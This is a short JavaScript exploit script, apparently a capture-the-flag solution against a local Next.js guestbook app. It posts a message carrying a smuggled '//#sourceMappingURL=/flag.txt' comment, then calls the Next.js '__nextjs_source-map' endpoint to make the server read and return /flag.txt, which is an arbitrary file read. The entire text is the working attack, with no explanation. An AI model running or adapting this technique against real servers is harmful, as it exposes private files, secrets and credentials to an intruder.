const REMOTE = "http://localhost:3000"

await (await fetch(`${REMOTE}/api/guestbook`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    "UR MESSAGE": `//#sourceMappingURL=${encodeURIComponent("/flag.txt")}`
  })
}))

let res2 = await fetch(`${REMOTE}/__nextjs_source-map?filename=file:///app/guestbook.txt`)
console.log(res2.status + ": " + await res2.text())
